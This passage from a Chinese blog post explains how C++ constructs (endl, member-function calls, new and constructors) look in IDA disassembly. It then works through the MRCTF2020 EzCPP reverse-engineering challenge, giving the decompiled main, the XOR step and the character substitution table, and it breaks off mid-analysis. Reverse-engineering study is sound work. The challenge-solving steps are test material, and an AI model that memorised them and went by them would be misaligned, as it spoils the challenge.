<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401594 sub     esp, 4</span><br><span class="line">.text:00401597 mov     dword ptr [esp], offset __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_ ; this</span><br><span class="line">.text:0040159E mov     ecx, eax</span><br><span class="line">.text:004015A0 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br></pre></td></tr></table></figure>
<p>又压栈了一个<code>__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_</code>的地址作为参数</p>
<p>这是个啥呢?跟踪它,IDA给出的注释是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ostream *__cdecl <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(<span class="built_in">std</span>::ostream *__os)</span><br></pre></td></tr></table></figure>
<p>原来是endl,它原来是个函数(函数模板)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ostream *__cdecl <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(<span class="built_in">std</span>::ostream *__os)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *v5)(<span class="type">char</span>); <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+4h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  v1 = *(_DWORD *)(*(_DWORD *)__os - <span class="number">12</span>);</span><br><span class="line">  v2 = *(_BYTE **)((<span class="type">char</span> *)__os + v1 + <span class="number">124</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="built_in">std</span>::__throw_bad_cast();</span><br><span class="line">  <span class="keyword">if</span> ( v2[<span class="number">28</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="type">char</span>)v2[<span class="number">39</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::_M_widen_init(*(_DWORD *)((<span class="type">char</span> *)__os + v1 + <span class="number">124</span>));</span><br><span class="line">    v5 = *(<span class="type">int</span> (__stdcall **)(<span class="type">char</span>))(*(_DWORD *)v2 + <span class="number">24</span>);</span><br><span class="line">    v3 = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::do_widen )</span><br><span class="line">      v3 = ((<span class="type">char</span> (__thiscall *)(_BYTE *, <span class="type">int</span>))v5)(v2, <span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::ostream::put((<span class="built_in">std</span>::ostream *)v3, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::ostream::flush(__os);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数的参数类型为<code>std::ostream *__os</code>,此os不是操作系统的缩写,而是ostream唯一的一个标准输出对象<code>cout</code></p>
<p>至于cout,endl,ostream都长啥样,干了啥,现在不做炎鸠,留作后话吧</p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/xiaofei0859/article/details/78452510">C++中endl的本质是什么_xiaofei0859的博客-CSDN博客_c++
endl</a></p>
<p>为啥可以<code>cout.operator&lt;&lt;(endl);</code>这样调用,endl不是一个函数吗?</p>
<p>显然ostream类中有对<code>operator&lt;&lt;(endl)</code>的重载函数,咋重载的现在不想了解</p>
<h2 id="总结">总结</h2>
<h4 id="调用约定">调用约定</h4>
<p>参数使用栈传递,从右向左压栈,栈顶是最左的参数</p>
<p>this指针使用ecx寄存器传递,成员函数的其他参数使用栈传递</p>
<p>成员函数返回值使用eax传递</p>
<p>成员函数的 调用和普通函数几乎没有区别,就多一个一个ecx传递对象指针</p>
<h4 id="new和构造函数的关系">new和构造函数的关系</h4>
<p>它俩不存在谁调用谁的关系,调用者函数首先调用operator
new函数在堆上申请空间,然后调用者接着调用构造函数初始化这片空间</p>
<h4 id="new的工作细节">new的工作细节</h4>
<p>在operator
new执行之前,调用者会把new应当申请多大空间,写到栈上,这个位置后来还得存放new返回的句柄</p>
<p>new不需要知道开辟空间是为了干什么,只需要一个大小参数</p>
<p>new会调用malloc函数,如果malloc开不出来则尝试调用get_new_handle即用户自定义的处理函数.</p>
<p>如果用户没有定义该函数则走默认的流程,</p>
<p>这个默认的流程还没有全炎鸠明白</p>
<h4 id="构造函数的工作细节">构造函数的工作细节</h4>
<p>反汇编视角下的构造函数和普通的成员函数没有区别,都是使用ecx表示当前对象地址,或者说new在堆上开出的地址</p>
<p>构造函数通过ecx拿到堆上的一片地址后,构造函数就认为这里就是我要进行初始化的对象,构造函数才不会管这片空间够不够大</p>
<p>因此</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Test *a=(Test*)new int;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种代码也是可以通过编译的,但是new只在堆上开了一个int的大小即4字节,显然放不开一个8字节的Test</p>
<p>但是编译器不知道,程序运行的时候也不知道,这就发生了类似数组访问越界的行为.Test.y成员写到堆上的位置是没有申请的空间,下一次申请堆空间就会覆盖掉这个地址</p>
<h2 id="mrctf2020-ezcpp">MRCTF2020-EzCPP</h2>
<h3 id="main函数">main函数</h3>
<p>ida给出的反编译伪代码真的是老太太的裹脚--又臭又长</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// bl</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-140h] BYREF</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+28h] [rbp-118h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+3Ch] [rbp-104h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">48</span>]; <span class="comment">// [rsp+60h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v20[<span class="number">31</span>]; <span class="comment">// [rsp+90h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+AFh] [rbp-91h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">47</span>]; <span class="comment">// [rsp+B0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [rsp+DFh] [rbp-61h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v24[<span class="number">36</span>]; <span class="comment">// [rsp+E0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+104h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// [rsp+108h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> *v27; <span class="comment">// [rsp+110h] [rbp-30h]</span></span><br><span class="line">  _DWORD *v28; <span class="comment">// [rsp+118h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> *v29; <span class="comment">// [rsp+120h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+12Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt;::<span class="built_in">vector</span>(v20, argv, envp);</span><br><span class="line">  std::vector&lt;<span class="type">bool</span>&gt;::<span class="built_in">vector</span>(v19);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v21);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v18, &amp;unk_500E, &amp;v21);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v21);</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;give me your key!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;keys[i]);</span><br><span class="line">    std::__cxx11::<span class="built_in">to_string</span>((std::__cxx11 *)v22, keys[i]);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>+=(v18, v22);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v22);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = keys;</span><br><span class="line">  v29 = keys;</span><br><span class="line">  v27 = (<span class="type">int</span> *)&amp;unk_<span class="number">83E4</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v29 != v27 )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = *v29;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt;::<span class="built_in">push_back</span>(v20, &amp;v17);</span><br><span class="line">    ++v29;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = std::vector&lt;std::shared_ptr&lt;SQLStorage::AddUpdateTable&gt;&gt;::<span class="built_in">end</span>(v20);</span><br><span class="line">  v5 = fmt::v6::internal::get_container&lt;fmt::v6::internal::buffer&lt;<span class="type">char</span>&gt;&gt;(v20);</span><br><span class="line">  std::for_each&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;&gt;,boost::unit_test::output::s_replace_chars&gt;(</span><br><span class="line">    v5,</span><br><span class="line">    v4);</span><br><span class="line">  v26 = v20;</span><br><span class="line">  v16 = fmt::v6::internal::get_container&lt;fmt::v6::internal::buffer&lt;<span class="type">char</span>&gt;&gt;(v20);</span><br><span class="line">  v15 = std::vector&lt;std::shared_ptr&lt;SQLStorage::AddUpdateTable&gt;&gt;::<span class="built_in">end</span>(v26);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;spdlog::details::log_msg_buffer <span class="type">const</span>*,std::vector&lt;spdlog::details::log_msg_buffer&gt;&gt;(</span><br><span class="line">            (<span class="type">const</span> __gnu_cxx::__normal_iterator&lt;<span class="type">const</span> std::shared_ptr&lt;sio::message&gt;*,std::vector&lt;std::shared_ptr&lt;sio::message&gt;&gt; &gt; *)&amp;v16,</span><br><span class="line">            (<span class="type">const</span> __gnu_cxx::__normal_iterator&lt;<span class="type">const</span> std::shared_ptr&lt;sio::message&gt;*,std::vector&lt;std::shared_ptr&lt;sio::message&gt;&gt; &gt; *)&amp;v15) )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = *(_DWORD *)__gnu_cxx::__normal_iterator&lt;<span class="type">int</span> *,std::vector&lt;<span class="type">int</span>&gt;&gt;::<span class="keyword">operator</span>*(&amp;v16);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v23);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v14, &amp;unk_500E, &amp;v23);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v23);</span><br><span class="line">    <span class="built_in">depart</span>(v25, (__int64)v14);</span><br><span class="line">    &#123;<span class="built_in">lambda</span>(std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt; &amp;)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(</span><br><span class="line">      (__int64)&amp;func,</span><br><span class="line">      (__int64)v14);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v24, v14);</span><br><span class="line">    v6 = !&#123;<span class="built_in">lambda</span>(std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;,<span class="type">int</span>)#<span class="number">2</span>&#125;::<span class="built_in">operator</span>()(</span><br><span class="line">            (__int64)&amp;check,</span><br><span class="line">            (__int64)v24,</span><br><span class="line">            v31);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v24);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Wrong password!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v31;</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v14);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">unsigned</span> <span class="type">int</span> *,std::vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt;&gt;::<span class="keyword">operator</span>++(&amp;v16);</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;right!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v9 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;flag:MRCTF&#123;md5(&quot;</span>);</span><br><span class="line">  v10 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>&gt;(v9, v18);</span><br><span class="line">  v11 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v10, <span class="string">&quot;)&#125;&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v12 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">          &amp;std::cout,</span><br><span class="line">          <span class="string">&quot;md5()-&gt;&#123;32/upper case/put the string into the function and transform into md5 hash&#125;&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v12, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v18);</span><br><span class="line">  std::vector&lt;<span class="type">bool</span>&gt;::~<span class="built_in">vector</span>(v19);</span><br><span class="line">  std::__cxx1998::vector&lt;<span class="type">double</span>,std::allocator&lt;<span class="type">double</span>&gt;&gt;::~<span class="built_in">vector</span>((std::vector&lt;std::shared_ptr&lt;sio::message&gt;&gt; *<span class="type">const</span>)v20);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中甚至都有分配器allocator实例的创建,还有析构函数的调用,真的是废话</p>
<p>ida有时候为同一对象创建了好多副本,但是实际上都是只读访问的副本,根本没有必要创建</p>
<p>甚至有的副本创建了根本不访问</p>
<p>为啥ida有时候显得很呆?</p>
<p>他只是刻板地按照堆栈中存在过的局部变量,决定创建或者不创建一个对象,它没法确定后来有没有使用这个对象,或者是否只是只读访问这个对象</p>
<h4 id="main翻译成人话">main翻译成人话</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">    string <span class="keyword">final</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;give me your key!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; keys[i];</span><br><span class="line">        <span class="keyword">final</span> += <span class="built_in">to_string</span>(keys[i]);</span><br><span class="line">        v.<span class="built_in">push_back</span>(keys[i] ^ <span class="number">1</span>);<span class="comment">//放到向量v里面的是输入与1的按位异或</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">length</span>(); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp;</span><br><span class="line">        <span class="built_in">depart</span>(v[i], temp);</span><br><span class="line"></span><br><span class="line">        将temp中的一些字符换掉</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (temp和ans[i] 字符串不相同)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;wrong password!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;right!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;flag:MRCTF&#123;md5(&quot;</span> &lt;&lt; <span class="keyword">final</span> &lt;&lt; <span class="string">&quot;)&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;md5()-&gt;&#123;32/upper case/put the string into the function and transform into md5 hash&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键点在于三个<code>lambda</code>和一个<code>depart</code></p>
<h4
id="第一个lambda已经翻译成人话了就是一个keysi1">第一个lambda已经翻译成人话了,就是一个<code>keys[i]^1</code></h4>
<h4
id="第二个lambda已经翻译成汉字了将temp中的一些字符换掉">第二个lambda已经翻译成汉字了,"将temp中的一些字符换掉"</h4>
<blockquote>
<p>具体的更换规则</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall &#123;lambda(<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt; &amp;)#<span class="number">1</span>&#125;::operator()(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">	将a2中的原数-&gt;新数</span><br><span class="line">	<span class="number">48</span>-&gt;<span class="number">79</span> 		<span class="number">0</span>-&gt;O</span><br><span class="line"> 	<span class="number">49</span>-&gt;<span class="number">108</span>		 <span class="number">1</span>-&gt;l</span><br><span class="line">  	<span class="number">50</span>-&gt;<span class="number">122</span>		<span class="number">2</span>-&gt;z</span><br><span class="line">	<span class="number">51</span>-&gt;<span class="number">69</span> 		<span class="number">3</span>-&gt;E</span><br><span class="line"> 	<span class="number">52</span>-&gt;<span class="number">65</span> 		<span class="number">4</span>-&gt;A</span><br><span class="line"> 	<span class="number">53</span>-&gt;<span class="number">115</span>		 <span class="number">5</span>-&gt;s</span><br><span class="line">	<span class="number">54</span>-&gt;<span class="number">71</span> 		<span class="number">6</span>-&gt;G</span><br><span class="line">	<span class="number">55</span>-&gt;<span class="number">84</span> 		<span class="number">7</span>-&gt;T</span><br><span class="line">	<span class="number">56</span>-&gt;<span class="number">66</span> 		<span class="number">8</span>-&gt;B</span><br><span class="line">	<span class="number">57</span>-&gt;<span class="number">113</span> 		<span class="number">9</span>-&gt;q</span><br><span class="line">	<span class="number">32</span>-&gt;<span class="number">61</span> 		空格-&gt;等号=</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>第三个<code>lambda</code>也翻译成汉字了"<code>temp</code>和<code>ans[i]</code>字符串不相同",这个就是判断条件</p>
<blockquote>
<p><code>ans[i]</code>是程序每次都会自动初始化好的,应该是全局位置的string数组,</p>
<p>这个数组的初始化在哪里看呢?</p>
<p>跟踪这个lambda表达式</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727215518968.png"
alt="image-20220727215518968" />
<figcaption aria-hidden="true">image-20220727215518968</figcaption>
</figure>
<p>继续跟踪这个ans数组</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727215551499.png"
alt="image-20220727215551499" />
<figcaption aria-hidden="true">image-20220727215551499</figcaption>
</figure>
<p>发现他在bss段,按下ctrl+x观察交叉引用,发现有一个<code>__static_initialization_and_destruction_0</code>函数引用过该数组,追踪该函数,其中有:</p>
